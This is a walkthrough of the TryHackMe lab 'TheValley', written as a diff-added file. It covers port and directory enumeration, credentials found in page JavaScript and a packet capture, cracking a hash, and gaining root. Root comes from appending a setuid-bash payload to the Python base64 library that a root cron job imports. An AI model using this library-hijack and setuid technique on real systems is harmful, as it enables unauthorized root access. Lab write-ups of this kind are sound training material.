@@ -1,0 +1,284 @@
+Today we are going to solve another tryhackme challenge listed easy named TheValley.
+
+
+Main IP :: 10.49.128.57
+
+Running all port scan.
+
+nmap 10.49.128.57 -p-
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-02 04:31 UTC
+Nmap scan report for ip-10-49-128-57.ap-south-1.compute.internal (10.49.128.57)
+Host is up (0.00062s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+37370/tcp open  unknown
+and we have this all let's perform 
+
+service and version detection scan further.
+
+Nmap scan report for 10.49.128.57
+Host is up, received reset ttl 62 (0.045s latency).
+Scanned at 2026-06-02 04:32:38 UTC for 11s
+
+PORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU=
+|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg=
+|   256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky
+80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Site doesn't have a title (text/html).
+37370/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
+Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+
+
+
+So we start with port 80 and an unwanted port 37370 which has ftp service running so let's start with this all.
+
+So basically we con't see much into the webpage let's start fuzzing the file and directories enumeration.
+
+
+gobuster dir -u http://10.49.128.57/ -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.49.128.57/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.hta                 (Status: 403) [Size: 277]
+.htaccess            (Status: 403) [Size: 277]
+.htpasswd            (Status: 403) [Size: 277]
+gallery              (Status: 301) [Size: 314] [--> http://10.49.128.57/gallery/]                               
+index.html           (Status: 200) [Size: 1163]
+pricing              (Status: 301) [Size: 314] [--> http://10.49.128.57/pricing/]                               
+server-status        (Status: 403) [Size: 277]
+static               (Status: 301) [Size: 313] [--> http://10.49.128.57/static/]  
+
+
+So we find this all from the gobuster let's try to look deeper again into the webpage what exactly this things have.
+
+
+And in pricing we kind of get's the hint for the note.txt which says 
+
+J,
+Please stop leaving notes randomly on the website
+-RP
+
+Also there is a thing when we go to static we see that it lists the file content with /static/01,/static/02 etc. like this so we will fuzz the files this way.
+
+seq -w 00 99 > num.txt
+
+with this we will have the file to fuzz for 
+
+ ffuf -u http://10.49.128.57/static/FUZZ -w num.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.49.128.57/static/FUZZ
+ :: Wordlist         : FUZZ: /home/kali/thm/valley/num.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [29/100] :: Job [1/1] :: 0 req/sec :: Durat:: Progress: [40/100] :: Job [1/1] :: 0 req/sec :: Durat00                      [Status: 200, Size: 127, Words: 15, Lines: 6, Duration: 153ms]
+:: Progress: [54/100] :: Job [1/1] :: 0 req/sec :: Durat:: Progress: [62/100] :: Job [1/1] :: 0 req/sec :: Durat:: Progress: [85/100] :: Job [1/1] :: 0 req/sec :: Durat:: Progress: [86/100] :: Job [1/1] :: 0 req/sec :: Durat:: Progress: [100/100] :: Job [1/1] :: 0 req/sec :: Dura11                      [Status: 200, Size: 627909, Words: 2055, Lines: 2130, Duration: 117ms]
+:: Progress: [100/100] :: Job [1/1] :: 110 req/sec :: Du12                      [Status: 200, Size: 2203486, Words: 1, Lines: 1, Duration: 119ms]
+:: Progress: [100/100] :: Job [1/1] :: 14 req/sec :: Dur10                      [Status: 200, Size: 2275927, Words: 1, Lines: 1, Duration: 124ms]
+:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Dura13                      [Status: 200, Size: 3673497, Words: 1, Lines: 1, Duration: 119ms]
+:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Dura15                      [Status: 200, Size: 3477315, Words: 1, Lines: 1, Duration: 129ms]
+:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Dura14                      [Status: 200, Size: 3838999, Words: 1, Lines: 1, Duration: 139ms]
+:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Dura16                      [Status: 200, Size: 2468462, Words: 1, Lines: 1, Duration: 129ms]
+:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Dura17                      [Status: 200, Size: 3551807, Words: 1, Lines: 1, Duration: 141ms]
+18                      [Status: 200, Size: 2036137, Words: 1, Lines: 1, Duration: 137ms]
+:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Dura:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Dura:: Progress: [100/100] :: Job [1/1] :: 10 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
+                                        
+                                        
+                                        
+Moving away with this let's check if we can get what we wanted or not.
+
+And on /static/00 we get
+
+dev notes from valleyDev:
+-add wedding photo examples
+-redo the editing on #4
+-remove /dev1243224123123
+-check for SIEM alerts
+
+Moving away with dev1243224123123
+
+We will see a login page at the page.
+
+Let's start to fuzz this all.
+
+
+And in the javascript column we have seen this 
+
+
+    if (username === "siemDev" && password === "california") {
+        window.location.href = "/dev1243224123123/devNotes37370.txt";
+        
+let's login and see what it says.
+
+dev notes for ftp server:
+-stop reusing credentials
+-check for any vulnerabilies
+-stay up to date on patching
+-change ftp port to normal port
+
+and we got this let's try this creds on ftp.
+
+
+And that works at best now let's get all the files for it.
+
+ftp> ls
+229 Entering Extended Passive Mode (|||17600|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
+-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
+-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
+226 Directory send OK.
+
+
+We will look deeper into all files with wireshark and then try to get data or required information.
+
+
+Frame 2335: Packet, 605 bytes on wire (4840 bits), 605 bytes captured (4840 bits) on interface any, id 0
+Linux cooked capture v1
+Internet Protocol Version 4, Src: 192.168.111.136, Dst: 192.168.111.136
+Transmission Control Protocol, Src Port: 47096, Dst Port: 80, Seq: 1, Ack: 1, Len: 537
+Hypertext Transfer Protocol
+    POST /index.html HTTP/1.1\r\n
+    Host: 192.168.111.136\r\n
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n
+    Accept-Language: en-US,en;q=0.5\r\n
+    Accept-Encoding: gzip, deflate\r\n
+    Content-Type: application/x-www-form-urlencoded\r\n
+    Content-Length: 42\r\n
+    Origin: http://192.168.111.136\r\n
+    Connection: keep-alive\r\n
+    Referer: http://192.168.111.136/index.html\r\n
+    Upgrade-Insecure-Requests: 1\r\n
+    \r\n
+    [Response in frame: 2337]
+    [Full request URI: http://192.168.111.136/index.html]
+    File Data: 42 bytes
+HTML Form URL Encoded: application/x-www-form-urlencoded
+    Form item: "uname" = "valleyDev"
+    Form item: "psw" = "ph0t0s1234"
+    Form item: "remember" = "on"
+
+
+And we get the username and password as you can see.
+
+
+ls
+user.txt
+valleyDev@valley:~$ cat user.txt 
+THM{k@l1_1n_th3_v@lley}
+
+TIME FOR PRIVILEGE ESCALATION ::
+
+ls
+siemDev  valley  valleyAuthenticator  valleyDev
+
+we get in our machine by creating python3 server which is rigorous.
+
+ wget http://10.49.128.57:8000/valleyAuthenticator
+--2026-06-02 04:58:01--  http://10.49.128.57:8000/valleyAuthenticator
+Connecting to 10.49.128.57:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 749128 (732K) [application/octet-stream]
+Saving to: ‘valleyAuthenticator’
+
+valleyAuthent 100% 731.57K  1.20MB/s    in 0.6s        
+
+2026-06-02 04:58:02 (1.20 MB/s) - ‘valleyAuthenticator’ saved [749128/749128]
+
+strings valleyAuthenticator | grep -i e672
+e6722920bab2326f8217e4 -> liberty123
+
+Which is from crackstation for valleyadmin user let's try this.
+
+
+so with above password for valley user
+
+su valley and passwd get's us the new user..
+
+valley@valley:/home$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *  * * * root    cd / && run-parts --report /etc/cron.hourly
+25 6  * * * root      test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6  * * 7 root      test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6  1 * * root      test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+
+#
+valley@valley:/home$ 
+
+
+now reading cron jobs we will read this part.
+
+Now we know that we can head towards the base64 library of python3.8
+
+valley@valley:/home$ echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")' >> /usr/lib/python3.8/base64.py 
+valley@valley:/home$ 
+
+we did this and now.
+
+valley@valley:/home$ /tmp/bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt 
+THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
+bash-5.0# 
+
+And we have the root shell.
+
+
+
+                                        
